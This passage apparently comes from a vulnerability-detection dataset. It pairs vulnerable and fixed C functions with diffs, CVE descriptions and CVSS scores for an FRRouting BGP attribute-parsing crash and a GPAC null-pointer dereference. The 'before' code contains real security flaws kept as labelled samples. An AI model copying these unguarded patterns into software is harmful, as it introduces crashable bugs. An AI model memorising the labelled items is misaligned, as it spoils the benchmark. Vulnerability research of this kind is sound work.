							  BGP_NOTIFY_UPDATE_ATTR_LENG_ERR,
							  ndata, ndl + lfl + 1);

				ret = BGP_ATTR_PARSE_ERROR;
				goto done;
			} else {
				/* Handling as per RFC7606 section 4, treat-as-withdraw approach
				 * must be followed when the total attribute length is in conflict
				 * with the enclosed path attribute length.
				 */
				flog_warn(
					EC_BGP_ATTRIBUTE_PARSE_WITHDRAW,
					""%s: Attribute %s, parse error - treating as withdrawal"",
					peer->host, lookup_msg(attr_str, type, NULL));
				ret = BGP_ATTR_PARSE_WITHDRAW;
				stream_forward_getp(BGP_INPUT(peer), endp - BGP_INPUT_PNT(peer));
				goto done;
			}
		}

		/* If attribute appears more than once in the UPDATE message,
		 * for MP_REACH_NLRI & MP_UNREACH_NLRI attributes
		 * the Error Subcode is set to Malformed Attribute List.
		 * For all other attributes, all the occurances of the attribute
		 * other than the first occurence is discarded. (RFC7606 3g)
		 */

		if (CHECK_BITMAP(seen, type)) {
			/* Only relax error handling for eBGP peers */
			if (peer->sort != BGP_PEER_EBGP ||
					type == BGP_ATTR_MP_REACH_NLRI || type == BGP_ATTR_MP_UNREACH_NLRI) {
				flog_warn(
					EC_BGP_ATTRIBUTE_REPEATED,
					""%s: error BGP attribute type %d appears twice in a message"",
					peer->host, type);

				bgp_notify_send(peer->connection,
						BGP_NOTIFY_UPDATE_ERR,
						BGP_NOTIFY_UPDATE_MAL_ATTR);
				ret = BGP_ATTR_PARSE_ERROR;
				goto done;
			} else {
				flog_warn(
					EC_BGP_ATTRIBUTE_REPEATED,
					""%s: error BGP attribute type %d appears twice in a message - discard attribute"",
					peer->host, type);
				/* Adjust the stream getp to the end of the attribute, in case we
				 * haven't read all the attributes.
				 */
				stream_set_getp(BGP_INPUT(peer),
					(startp - STREAM_DATA(BGP_INPUT(peer))) + (attr_endp - startp));
				continue;
			}
		}

		/* Set type to bitmap to check duplicate attribute.  `type' is
		   unsigned char so it never overflow bitmap range. */

		SET_BITMAP(seen, type);

		struct bgp_attr_parser_args attr_args = {
			.peer = peer,
			.length = length,
			.attr = attr,
			.type = type,
			.flags = flag,
			.startp = startp,
			.total = attr_endp - startp,
		};


		/* If any recognized attribute has Attribute Flags that conflict
		   with the Attribute Type Code, then the Error Subcode is set
		   to
		   Attribute Flags Error.  The Data field contains the erroneous
		   attribute (type, length and value). */
		if (bgp_attr_flag_invalid(&attr_args)) {
			ret = bgp_attr_malformed(
				&attr_args, BGP_NOTIFY_UPDATE_ATTR_FLAG_ERR,
				attr_args.total);
			if (ret == BGP_ATTR_PARSE_PROCEED)
				continue;
			stream_forward_getp(BGP_INPUT(peer), endp - BGP_INPUT_PNT(peer));
			goto done;
		}

		/* OK check attribute and store it's value. */
		switch (type) {
		case BGP_ATTR_ORIGIN:
			ret = bgp_attr_origin(&attr_args);
			break;
		case BGP_ATTR_AS_PATH:
			ret = bgp_attr_aspath(&attr_args);
			break;
		case BGP_ATTR_AS4_PATH:
			ret = bgp_attr_as4_path(&attr_args, &as4_path);
			break;
		case BGP_ATTR_NEXT_HOP:
			ret = bgp_attr_nexthop(&attr_args);
			break;
		case BGP_ATTR_MULTI_EXIT_DISC:
			ret = bgp_attr_med(&attr_args);
			break;
		case BGP_ATTR_LOCAL_PREF:
			ret = bgp_attr_local_pref(&attr_args);
			break;
		case BGP_ATTR_ATOMIC_AGGREGATE:
			ret = bgp_attr_atomic(&attr_args);
			break;
		case BGP_ATTR_AGGREGATOR:
			ret = bgp_attr_aggregator(&attr_args);
			break;
		case BGP_ATTR_AS4_AGGREGATOR:
			ret = bgp_attr_as4_aggregator(&attr_args,
						      &as4_aggregator,
						      &as4_aggregator_addr);
			break;
		case BGP_ATTR_COMMUNITIES:
			ret = bgp_attr_community(&attr_args);
			break;
		case BGP_ATTR_LARGE_COMMUNITIES:
			ret = bgp_attr_large_community(&attr_args);
			break;
		case BGP_ATTR_ORIGINATOR_ID:
			ret = bgp_attr_originator_id(&attr_args);
			break;
		case BGP_ATTR_CLUSTER_LIST:
			ret = bgp_attr_cluster_list(&attr_args);
			break;
		case BGP_ATTR_MP_REACH_NLRI:
			ret = bgp_mp_reach_parse(&attr_args, mp_update);
			break;
		case BGP_ATTR_MP_UNREACH_NLRI:
			ret = bgp_mp_unreach_parse(&attr_args, mp_withdraw);
			break;
		case BGP_ATTR_EXT_COMMUNITIES:
			ret = bgp_attr_ext_communities(&attr_args);
			break;
#ifdef ENABLE_BGP_VNC_ATTR
		case BGP_ATTR_VNC:
#endif
		case BGP_ATTR_ENCAP:
			ret = bgp_attr_encap(&attr_args);
			break;
		case BGP_ATTR_PREFIX_SID:
			ret = bgp_attr_prefix_sid(&attr_args);
			break;
		case BGP_ATTR_PMSI_TUNNEL:
			ret = bgp_attr_pmsi_tunnel(&attr_args);
			break;
		case BGP_ATTR_IPV6_EXT_COMMUNITIES:
			ret = bgp_attr_ipv6_ext_communities(&attr_args);
			break;
		case BGP_ATTR_OTC:
			ret = bgp_attr_otc(&attr_args);
			break;
		case BGP_ATTR_AIGP:
			ret = bgp_attr_aigp(&attr_args);
			break;
		default:
			ret = bgp_attr_unknown(&attr_args);
			break;
		}

		if (ret == BGP_ATTR_PARSE_ERROR_NOTIFYPLS) {
			bgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,
					BGP_NOTIFY_UPDATE_MAL_ATTR);
			ret = BGP_ATTR_PARSE_ERROR;
			goto done;
		}

		if (ret == BGP_ATTR_PARSE_ERROR) {
			flog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,
				  ""%s: Attribute %s, parse error"", peer->host,
				  lookup_msg(attr_str, type, NULL));
			goto done;
		}
		if (ret == BGP_ATTR_PARSE_WITHDRAW) {
			flog_warn(
				EC_BGP_ATTRIBUTE_PARSE_WITHDRAW,
				""%s: Attribute %s, parse error - treating as withdrawal"",
				peer->host, lookup_msg(attr_str, type, NULL));
			stream_forward_getp(BGP_INPUT(peer), endp - BGP_INPUT_PNT(peer));
			goto done;
		}

		/* Check the fetched length. */
		if (BGP_INPUT_PNT(peer) != attr_endp) {
			flog_warn(EC_BGP_ATTRIBUTE_FETCH_ERROR,
				  ""%s: BGP attribute %s, fetch error"",
				  peer->host, lookup_msg(attr_str, type, NULL));
			bgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,
					BGP_NOTIFY_UPDATE_ATTR_LENG_ERR);
			ret = BGP_ATTR_PARSE_ERROR;
			goto done;
		}
	}

	/*
	 * draft-ietf-idr-bgp-prefix-sid-27#section-3:
	 * About Prefix-SID path attribute,
	 * Label-Index TLV(type1) and The Originator SRGB TLV(type-3)
	 * may only appear in a BGP Prefix-SID attribute attached to
	 * IPv4/IPv6 Labeled Unicast prefixes ([RFC8277]).
	 * It MUST be ignored when received for other BGP AFI/SAFI combinations.
	 */
	if (!attr->mp_nexthop_len || mp_update->safi != SAFI_LABELED_UNICAST)
		attr->label_index = BGP_INVALID_LABEL_INDEX;

	/* Check final read pointer is same as end pointer. */
	if (BGP_INPUT_PNT(peer) != endp) {
		flog_warn(EC_BGP_ATTRIBUTES_MISMATCH,
			  ""%s: BGP attribute %s, length mismatch"", peer->host,
			  lookup_msg(attr_str, type, NULL));
		bgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,
				BGP_NOTIFY_UPDATE_ATTR_LENG_ERR);

		ret = BGP_ATTR_PARSE_ERROR;
		goto done;
	}

	/*
	 * RFC4271: If the NEXT_HOP attribute field is syntactically incorrect,
	 * then the Error Subcode MUST be set to Invalid NEXT_HOP Attribute.
	 * This is implemented below and will result in a NOTIFICATION. If the
	 * NEXT_HOP attribute is semantically incorrect, the error SHOULD be
	 * logged, and the route SHOULD be ignored. In this case, a NOTIFICATION
	 * message SHOULD NOT be sent. This is implemented elsewhere.
	 *
	 * RFC4760: An UPDATE message that carries no NLRI, other than the one
	 * encoded in the MP_REACH_NLRI attribute, SHOULD NOT carry the NEXT_HOP
	 * attribute. If such a message contains the NEXT_HOP attribute, the BGP
	 * speaker that receives the message SHOULD ignore this attribute.
	 */
	if (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_NEXT_HOP))
	    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI))) {
		if (bgp_attr_nexthop_valid(peer, attr) < 0) {
			ret = BGP_ATTR_PARSE_ERROR;
			goto done;
		}
	}

	/* Check all mandatory well-known attributes are present */
	ret = bgp_attr_check(peer, attr, length);
	if (ret < 0)
		goto done;

	/*
	 * At this place we can see whether we got AS4_PATH and/or
	 * AS4_AGGREGATOR from a 16Bit peer and act accordingly.
	 * We can not do this before we've read all attributes because
	 * the as4 handling does not say whether AS4_PATH has to be sent
	 * after AS_PATH or not - and when AS4_AGGREGATOR will be send
	 * in relationship to AGGREGATOR.
	 * So, to be defensive, we are not relying on any order and read
	 * all attributes first, including these 32bit ones, and now,
	 * afterwards, we look what and if something is to be done for as4.
	 *
	 * It is possible to not have AS_PATH, e.g. GR EoR and sole
	 * MP_UNREACH_NLRI.
	 */
	/* actually... this doesn't ever return failure currently, but
	 * better safe than sorry */
	if (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_AS_PATH))
	    && bgp_attr_munge_as4_attrs(peer, attr, as4_path, as4_aggregator,
					&as4_aggregator_addr)) {
		bgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,
				BGP_NOTIFY_UPDATE_MAL_ATTR);
		ret = BGP_ATTR_PARSE_ERROR;
		goto done;
	}

	/*
	 * Finally do the checks on the aspath we did not do yet
	 * because we waited for a potentially synthesized aspath.
	 */
	if (attr->flag & (ATTR_FLAG_BIT(BGP_ATTR_AS_PATH))) {
		ret = bgp_attr_aspath_check(peer, attr);
		if (ret != BGP_ATTR_PARSE_PROCEED)
			goto done;
	}

	ret = BGP_ATTR_PARSE_PROCEED;
done:

	/*
	 * At this stage, we have done all fiddling with as4, and the
	 * resulting info is in attr->aggregator resp. attr->aspath so
	 * we can chuck as4_aggregator and as4_path alltogether in order
	 * to save memory
	 */
	/*
	 * unintern - it is in the hash
	 * The flag that we got this is still there, but that
	 * does not do any trouble
	 */
	aspath_unintern(&as4_path);

	transit = bgp_attr_get_transit(attr);
	if (ret != BGP_ATTR_PARSE_ERROR) {
		/* Finally intern unknown attribute. */
		if (transit)
			bgp_attr_set_transit(attr, transit_intern(transit));
		if (attr->encap_subtlvs)
			attr->encap_subtlvs = encap_intern(attr->encap_subtlvs,
							   ENCAP_SUBTLV_TYPE);
#ifdef ENABLE_BGP_VNC
		struct bgp_attr_encap_subtlv *vnc_subtlvs =
			bgp_attr_get_vnc_subtlvs(attr);

		if (vnc_subtlvs)
			bgp_attr_set_vnc_subtlvs(
				attr,
				encap_intern(vnc_subtlvs, VNC_SUBTLV_TYPE));
#endif
	} else {
		if (transit) {
			transit_free(transit);
			bgp_attr_set_transit(attr, NULL);
		}

		bgp_attr_flush_encap(attr);
	};

	/* Sanity checks */
	transit = bgp_attr_get_transit(attr);
	if (transit)
		assert(transit->refcnt > 0);
	if (attr->encap_subtlvs)
		assert(attr->encap_subtlvs->refcnt > 0);
#ifdef ENABLE_BGP_VNC
	struct bgp_attr_encap_subtlv *vnc_subtlvs =
		bgp_attr_get_vnc_subtlvs(attr);

	if (vnc_subtlvs)
		assert(vnc_subtlvs->refcnt > 0);
#endif

	return ret;
}","enum bgp_attr_parse_ret bgp_attr_parse(struct peer *peer, struct attr *attr,
				       bgp_size_t VAR_0,
				       struct bgp_nlri *VAR_1,
				       struct bgp_nlri *VAR_2)
{
	enum bgp_attr_parse_ret VAR_3;
	uint8_t VAR_4 = 0;
	uint8_t VAR_5 = 0;
	bgp_size_t VAR_6 = 0;
	uint8_t *VAR_7, *VAR_8;
	uint8_t *VAR_9;
	uint8_t VAR_10[VAR_11];
	/* COMMENT_0 */
         
	/* COMMENT_2 */
	struct aspath *VAR_12 = NULL;
	as_t VAR_13 = 0;
	struct in_addr VAR_14 = {.s_addr = 0};
	struct transit *transit;

	/* COMMENT_3 */
	memset(VAR_10, 0, VAR_11);

	/* COMMENT_4 */
	VAR_8 = BGP_INPUT_PNT(peer) + VAR_0;

	/* COMMENT_5 */
	while (BGP_INPUT_PNT(peer) < VAR_8) {
		VAR_7 = BGP_INPUT_PNT(peer);

		/* COMMENT_6 */
                                                          
                                                           
                                                          
                                                          
                                                     
    
                                                          
                                                          
                                                         
                                                          
                                                          
     

		/* COMMENT_19 */
		if ((VAR_8 - VAR_7) < VAR_15) {
			/* COMMENT_20 */
			flog_warn(
				VAR_16,
				""%s: error BGP attribute length %lu is smaller than min len"",
				peer->host,
				(unsigned long)(VAR_8
						- stream_pnt(BGP_INPUT(peer))));

			if (peer->sort != VAR_17) {
				bgp_notify_send(peer->connection,
						VAR_18,
						VAR_19);
				VAR_3 = VAR_20;
			} else {
				VAR_3 = VAR_21;
			}

			goto done;
		}

		/* COMMENT_21 */
                                                               
                                                                 
              
     
		VAR_4 = 0xF0 & stream_getc(BGP_INPUT(peer));
		VAR_5 = stream_getc(BGP_INPUT(peer));

		/* COMMENT_26 */
		if (CHECK_FLAG(VAR_4, VAR_22)
		    && ((VAR_8 - VAR_7) < (VAR_15 + 1))) {
			flog_warn(
				VAR_23,
				""%s: Extended length set, but just %lu bytes of attr header"",
				peer->host,
				(unsigned long)(VAR_8
						- stream_pnt(BGP_INPUT(peer))));

			if (peer->sort != VAR_17) {
				bgp_notify_send(peer->connection,
						VAR_18,
						VAR_19);
				VAR_3 = VAR_20;
			} else {
				VAR_3 = VAR_21;
			}

			goto done;
		}

		/* COMMENT_27 */
		if (CHECK_FLAG(VAR_4, VAR_22))
			VAR_6 = stream_getw(BGP_INPUT(peer));
		else
			VAR_6 = stream_getc(BGP_INPUT(peer));

		/* COMMENT_28 */
		VAR_9 = BGP_INPUT_PNT(peer) + VAR_6;

		if (VAR_9 > VAR_8) {
			flog_warn(
				VAR_24,
				""%s: BGP type %d length %d is too large, attribute total length is %d.  attr_endp is %p.  endp is %p"",
				peer->host, VAR_5, VAR_6, VAR_0, VAR_9,
				VAR_8);

			/* COMMENT_29 */
			if (peer->sort != VAR_17) {
				/* COMMENT_30 */
                   
                                                   
                                                     
                                                   
                                                    
                                                        
                                           
                 
                                                           
                                                        
                                                   
                                                         
                                                      
      
                                                           
                                                           
                                                         
                                              
       
				unsigned char VAR_25[peer->max_packet_size];

				memset(VAR_25, 0x00, sizeof(VAR_25));
				size_t VAR_26 =
					CHECK_FLAG(VAR_4, VAR_22) ? 2 : 1;
				/* COMMENT_50 */
				stream_rewind_getp(BGP_INPUT(peer), (1 + VAR_26));
				/* COMMENT_51 */
				stream_get(&VAR_25[0], BGP_INPUT(peer), 1);
				/* COMMENT_52 */
				stream_get(&VAR_25[1], BGP_INPUT(peer), VAR_26);
				/* COMMENT_53 */
				size_t VAR_27 = VAR_9 - VAR_7;
				size_t VAR_28 = MIN(VAR_27, STREAM_READABLE(BGP_INPUT(peer)));

				stream_get(&VAR_25[VAR_26 + 1], BGP_INPUT(peer), VAR_28);

				bgp_notify_send_with_data(peer->connection,
							  VAR_18,
							  VAR_19,
							  VAR_25, VAR_28 + VAR_26 + 1);

				VAR_3 = VAR_20;
				goto done;
			} else {
				/* COMMENT_54 */
                                                                      
                                               
       
				flog_warn(
					VAR_29,
					""%s: Attribute %s, parse error - treating as withdrawal"",
					peer->host, lookup_msg(VAR_30, VAR_5, NULL));
				VAR_3 = VAR_21;
				stream_forward_getp(BGP_INPUT(peer), VAR_8 - BGP_INPUT_PNT(peer));
				goto done;
			}
		}

		/* COMMENT_58 */
                                                   
                                                          
                                                                  
                                                              
     

		if (CHECK_BITMAP(VAR_10, VAR_5)) {
			/* COMMENT_29 */
			if (peer->sort != VAR_17 ||
					VAR_5 == VAR_31 || VAR_5 == VAR_32) {
				flog_warn(
					VAR_33,
					""%s: error BGP attribute type %d appears twice in a message"",
					peer->host, VAR_5);

				bgp_notify_send(peer->connection,
						VAR_18,
						VAR_34);
				VAR_3 = VAR_20;
				goto done;
			} else {
				flog_warn(
					VAR_33,
					""%s: error BGP attribute type %d appears twice in a message - discard attribute"",
					peer->host, VAR_5);
				/* COMMENT_64 */
                                       
       
				stream_set_getp(BGP_INPUT(peer),
					(VAR_7 - STREAM_DATA(BGP_INPUT(peer))) + (VAR_9 - VAR_7));
				continue;
			}
		}

		/* COMMENT_67 */
                                                        

		SET_BITMAP(VAR_10, VAR_5);

		struct bgp_attr_parser_args VAR_35 = {
			.peer = peer,
			.length = VAR_6,
			.attr = attr,
			.type = VAR_5,
			.flags = VAR_4,
			.startp = VAR_7,
			.total = VAR_9 - VAR_7,
		};


		/* COMMENT_69 */
                                                                
       
                                                                  
                                           
		if (bgp_attr_flag_invalid(&VAR_35)) {
			VAR_3 = bgp_attr_malformed(
				&VAR_35, VAR_36,
				VAR_35.total);
			if (VAR_3 == VAR_37)
				continue;
			stream_forward_getp(BGP_INPUT(peer), VAR_8 - BGP_INPUT_PNT(peer));
			goto done;
		}

		/* COMMENT_74 */
		switch (VAR_5) {
		case VAR_38:
			VAR_3 = bgp_attr_origin(&VAR_35);
			break;
		case VAR_39:
			VAR_3 = bgp_attr_aspath(&VAR_35);
			break;
		case VAR_40:
			VAR_3 = bgp_attr_as4_path(&VAR_35, &VAR_12);
			break;
		case VAR_41:
			VAR_3 = bgp_attr_nexthop(&VAR_35);
			break;
		case VAR_42:
			VAR_3 = bgp_attr_med(&VAR_35);
			break;
		case VAR_43:
			VAR_3 = bgp_attr_local_pref(&VAR_35);
			break;
		case VAR_44:
			VAR_3 = bgp_attr_atomic(&VAR_35);
			break;
		case VAR_45:
			VAR_3 = bgp_attr_aggregator(&VAR_35);
			break;
		case VAR_46:
			VAR_3 = bgp_attr_as4_aggregator(&VAR_35,
						      &VAR_13,
						      &VAR_14);
			break;
		case VAR_47:
			VAR_3 = bgp_attr_community(&VAR_35);
			break;
		case VAR_48:
			VAR_3 = bgp_attr_large_community(&VAR_35);
			break;
		case VAR_49:
			VAR_3 = bgp_attr_originator_id(&VAR_35);
			break;
		case VAR_50:
			VAR_3 = bgp_attr_cluster_list(&VAR_35);
			break;
		case VAR_31:
			VAR_3 = bgp_mp_reach_parse(&VAR_35, VAR_1);
			break;
		case VAR_32:
			VAR_3 = bgp_mp_unreach_parse(&VAR_35, VAR_2);
			break;
		case VAR_51:
			VAR_3 = bgp_attr_ext_communities(&VAR_35);
			break;
#ifdef VAR_52
		case VAR_53:
#endif
		case VAR_54:
			VAR_3 = bgp_attr_encap(&VAR_35);
			break;
		case VAR_55:
			VAR_3 = bgp_attr_prefix_sid(&VAR_35);
			break;
		case VAR_56:
			VAR_3 = bgp_attr_pmsi_tunnel(&VAR_35);
			break;
		case VAR_57:
			VAR_3 = bgp_attr_ipv6_ext_communities(&VAR_35);
			break;
		case VAR_58:
			VAR_3 = bgp_attr_otc(&VAR_35);
			break;
		case VAR_59:
			VAR_3 = bgp_attr_aigp(&VAR_35);
			break;
		default:
			VAR_3 = bgp_attr_unknown(&VAR_35);
			break;
		}

		if (VAR_3 == VAR_60) {
			bgp_notify_send(peer->connection, VAR_18,
					VAR_34);
			VAR_3 = VAR_20;
			goto done;
		}

		if (VAR_3 == VAR_20) {
			flog_warn(VAR_61,
				  ""%s: Attribute %s, parse error"", peer->host,
				  lookup_msg(VAR_30, VAR_5, NULL));
			goto done;
		}
		if (VAR_3 == VAR_21) {
			flog_warn(
				VAR_29,
				""%s: Attribute %s, parse error - treating as withdrawal"",
				peer->host, lookup_msg(VAR_30, VAR_5, NULL));
			stream_forward_getp(BGP_INPUT(peer), VAR_8 - BGP_INPUT_PNT(peer));
			goto done;
		}

		/* COMMENT_75 */
		if (BGP_INPUT_PNT(peer) != VAR_9) {
			flog_warn(VAR_62,
				  ""%s: BGP attribute %s, fetch error"",
				  peer->host, lookup_msg(VAR_30, VAR_5, NULL));
			bgp_notify_send(peer->connection, VAR_18,
					VAR_19);
			VAR_3 = VAR_20;
			goto done;
		}
	}

	/* COMMENT_76 */
                                               
                                    
                                                              
                                                             
                                                   
                                                                         
    
	if (!attr->mp_nexthop_len || VAR_1->safi != VAR_63)
		attr->label_index = VAR_64;

	/* COMMENT_84 */
	if (BGP_INPUT_PNT(peer) != VAR_8) {
		flog_warn(VAR_65,
			  ""%s: BGP attribute %s, length mismatch"", peer->host,
			  lookup_msg(VAR_30, VAR_5, NULL));
		bgp_notify_send(peer->connection, VAR_18,
				VAR_19);

		VAR_3 = VAR_20;
		goto done;
	}

	/* COMMENT_85 */
                                                                        
                                                                     
                                                                       
                                                                     
                                                                         
                                                              
   
                                                                       
                                                                         
                                                                         
                                                                   
    
	if (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_41))
	    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_31))) {
		if (bgp_attr_nexthop_valid(peer, attr) < 0) {
			VAR_3 = VAR_20;
			goto done;
		}
	}

	/* COMMENT_98 */
	VAR_3 = bgp_attr_check(peer, attr, VAR_6);
	if (VAR_3 < 0)
		goto done;

	/* COMMENT_99 */
                                                           
                                                         
                                                               
                                                                 
                                                               
                                  
                                                                 
                                                              
                                                                    
   
                                                            
                    
    
	/* COMMENT_113 */
                             
	if (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_39))
	    && bgp_attr_munge_as4_attrs(peer, attr, VAR_12, VAR_13,
					&VAR_14)) {
		bgp_notify_send(peer->connection, VAR_18,
				VAR_34);
		VAR_3 = VAR_20;
		goto done;
	}

	/* COMMENT_115 */
                                                         
                                                           
    
	if (attr->flag & (ATTR_FLAG_BIT(VAR_39))) {
		VAR_3 = bgp_attr_aspath_check(peer, attr);
		if (VAR_3 != VAR_37)
			goto done;
	}

	VAR_3 = VAR_37;
done:

	/* COMMENT_119 */
                                                              
                                                               
                                                                 
                  
    
	/* COMMENT_125 */
                                
                                                      
                           
    
	aspath_unintern(&VAR_12);

	transit = bgp_attr_get_transit(attr);
	if (VAR_3 != VAR_20) {
		/* COMMENT_130 */
		if (transit)
			bgp_attr_set_transit(attr, transit_intern(transit));
		if (attr->encap_subtlvs)
			attr->encap_subtlvs = encap_intern(attr->encap_subtlvs,
							   VAR_66);
#ifdef VAR_67
		struct bgp_attr_encap_subtlv *VAR_68 =
			bgp_attr_get_vnc_subtlvs(attr);

		if (VAR_68)
			bgp_attr_set_vnc_subtlvs(
				attr,
				encap_intern(VAR_68, VAR_69));
#endif
	} else {
		if (transit) {
			transit_free(transit);
			bgp_attr_set_transit(attr, NULL);
		}

		bgp_attr_flush_encap(attr);
	};

	/* COMMENT_131 */
	transit = bgp_attr_get_transit(attr);
	if (transit)
		assert(transit->refcnt > 0);
	if (attr->encap_subtlvs)
		assert(attr->encap_subtlvs->refcnt > 0);
#ifdef VAR_67
	struct bgp_attr_encap_subtlv *VAR_68 =
		bgp_attr_get_vnc_subtlvs(attr);

	if (VAR_68)
		assert(VAR_68->refcnt > 0);
#endif

	return VAR_3;
}",FRRouting/frr/d8482bf011cb2b173e85b65b4bf3d5061250cdb9/bgp_attr.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -6,7 +6,7 @@
 	enum bgp_attr_parse_ret ret;
 	uint8_t flag = 0;
 	uint8_t type = 0;
-	bgp_size_t length;
+	bgp_size_t length = 0;
 	uint8_t *startp, *endp;
 	uint8_t *attr_endp;
 	uint8_t seen[BGP_ATTR_BITMAP_SIZE];
@@ -394,7 +394,7 @@
 	}
 
 	/* Check all mandatory well-known attributes are present */
-	ret = bgp_attr_check(peer, attr);
+	ret = bgp_attr_check(peer, attr, length);
 	if (ret < 0)
 		goto done;
 ","{'deleted_lines': ['\tbgp_size_t length;', '\tret = bgp_attr_check(peer, attr);'], 'added_lines': ['\tbgp_size_t length = 0;', '\tret = bgp_attr_check(peer, attr, length);']}",True,"An issue was discovered in FRRouting FRR through 9.0.1. A crash can occur for a crafted BGP UPDATE message without mandatory attributes, e.g., one with only an unknown transit attribute.",7.5,HIGH,2,valid,2023-10-23T20:34:10Z,4
CVE-2023-46928,['CWE-Other'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,gpac,null guard on gf_media_change_pl (fixes #2661),0753bf6d867343a80a044bf47a27d0b7accc8bf1,https://github.com/gpac/gpac/commit/0753bf6d867343a80a044bf47a27d0b7accc8bf1,src/media_tools/isom_tools.c,gf_media_change_pl,"GF_EXPORT
GF_Err gf_media_change_pl(GF_ISOFile *file, u32 track, u32 profile, u32 compat, u32 level)
{
u32 i, count, stype;
GF_Err e;
GF_AVCConfig *avcc;
stype = gf_isom_get_media_subtype(file, track, 1);
switch (stype) {
case GF_ISOM_SUBTYPE_AVC_H264:
case GF_ISOM_SUBTYPE_AVC2_H264:
case GF_ISOM_SUBTYPE_AVC3_H264:
case GF_ISOM_SUBTYPE_AVC4_H264:
break;
default:
return GF_OK;
}
avcc = gf_isom_avc_config_get(file, track, 1);
if (level) avcc->AVCLevelIndication = level;
if (compat) avcc->profile_compatibility = compat;
if (profile) avcc->AVCProfileIndication = profile;
count = gf_list_count(avcc->sequenceParameterSets);
for (i=0; i<count; i++) {
GF_NALUFFParam *slc = gf_list_get(avcc->sequenceParameterSets, i);
if (profile) slc->data[1] = profile;
if (level) slc->data[3] = level;
}
e = gf_isom_avc_config_update(file, track, 1, avcc);
gf_odf_avc_cfg_del(avcc);
return e;
}","GF_EXPORT
VAR_0 gf_media_change_pl(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, u32 VAR_4, u32 VAR_5)
{
u32 VAR_6, VAR_7, VAR_8;
GF_Err VAR_9;
GF_AVCConfig *VAR_10;
VAR_8 = gf_isom_get_media_subtype(VAR_1, VAR_2, 1);
switch (VAR_8) {
case VAR_11:
case VAR_12:
case VAR_13:
case VAR_14:
break;
default:
return VAR_15;
}
VAR_10 = gf_isom_avc_config_get(VAR_1, VAR_2, 1);
if (VAR_5) VAR_10->AVCLevelIndication = VAR_5;
if (VAR_4) VAR_10->profile_compatibility = VAR_4;
if (VAR_3) VAR_10->AVCProfileIndication = VAR_3;
VAR_7 = gf_list_count(VAR_10->sequenceParameterSets);
for (VAR_6=0; VAR_6<VAR_7; VAR_6++) {
GF_NALUFFParam *VAR_16 = gf_list_get(VAR_10->sequenceParameterSets, VAR_6);
if (VAR_3) VAR_16->data[1] = VAR_3;
if (VAR_5) VAR_16->data[3] = VAR_5;
}
VAR_9 = gf_isom_avc_config_update(VAR_1, VAR_2, 1, VAR_10);
gf_odf_avc_cfg_del(VAR_10);
return VAR_9;
}",,"GF_EXPORT
GF_Err gf_media_change_pl(GF_ISOFile *file, u32 track, u32 profile, u32 compat, u32 level)
{
	u32 i, count, stype;
	GF_Err e;
	GF_AVCConfig *avcc;

	stype = gf_isom_get_media_subtype(file, track, 1);
	switch (stype) {
	case GF_ISOM_SUBTYPE_AVC_H264:
	case GF_ISOM_SUBTYPE_AVC2_H264:
	case GF_ISOM_SUBTYPE_AVC3_H264:
	case GF_ISOM_SUBTYPE_AVC4_H264:
		break;
	default:
		return GF_OK;
	}

	avcc = gf_isom_avc_config_get(file, track, 1);

	if (!avcc)
		return GF_NON_COMPLIANT_BITSTREAM;

	if (level) avcc->AVCLevelIndication = level;
	if (compat) avcc->profile_compatibility = compat;
	if (profile) avcc->AVCProfileIndication = profile;
	count = gf_list_count(avcc->sequenceParameterSets);
	for (i=0; i<count; i++) {
		GF_NALUFFParam *slc = gf_list_get(avcc->sequenceParameterSets, i);
		if (profile) slc->data[1] = profile;
		if (level) slc->data[3] = level;
	}
	e = gf_isom_avc_config_update(file, track, 1, avcc);

	gf_odf_avc_cfg_del(avcc);
	return e;
}","GF_EXPORT
VAR_0 gf_media_change_pl(GF_ISOFile *VAR_1, u32 VAR_2, u32 VAR_3, u32 VAR_4, u32 VAR_5)
{
	u32 VAR_6, VAR_7, VAR_8;
	GF_Err VAR_9;
	GF_AVCConfig *VAR_10;

	VAR_8 = gf_isom_get_media_subtype(VAR_1, VAR_2, 1);
	switch (VAR_8) {
	case VAR_11:
	case VAR_12:
	case VAR_13:
	case VAR_14:
		break;
	default:
		return VAR_15;
	}

	VAR_10 = gf_isom_avc_config_get(VAR_1, VAR_2, 1);

	if (!VAR_10)
		return VAR_16;

	if (VAR_5) VAR_10->AVCLevelIndication = VAR_5;
	if (VAR_4) VAR_10->profile_compatibility = VAR_4;
	if (VAR_3) VAR_10->AVCProfileIndication = VAR_3;
	VAR_7 = gf_list_count(VAR_10->sequenceParameterSets);
	for (VAR_6=0; VAR_6<VAR_7; VAR_6++) {
		GF_NALUFFParam *VAR_17 = gf_list_get(VAR_10->sequenceParameterSets, VAR_6);
		if (VAR_3) VAR_17->data[1] = VAR_3;
		if (VAR_5) VAR_17->data[3] = VAR_5;
	}
	VAR_9 = gf_isom_avc_config_update(VAR_1, VAR_2, 1, VAR_10);

	gf_odf_avc_cfg_del(VAR_10);
	return VAR_9;
}",,"--- func_before
+++ func_after
@@ -17,6 +17,10 @@
 	}
 
 	avcc = gf_isom_avc_config_get(file, track, 1);
+
+	if (!avcc)
+		return GF_NON_COMPLIANT_BITSTREAM;
+
 	if (level) avcc->AVCLevelIndication = level;
 	if (compat) avcc->profile_compatibility = compat;
 	if (profile) avcc->AVCProfileIndication = profile;","{'deleted_lines': [], 'added_lines': ['', '\tif (!avcc)', '\t\treturn GF_NON_COMPLIANT_BITSTREAM;', '']}",True,GPAC 2.3-DEV-rev605-gfc9e29089-master contains a SEGV in gpac/MP4Box in gf_media_change_pl /afltest/gpac/src/media_tools/isom_tools.c:3293:42.,5.5,MEDIUM,1,valid,2023-10-26T10:27:53Z,4
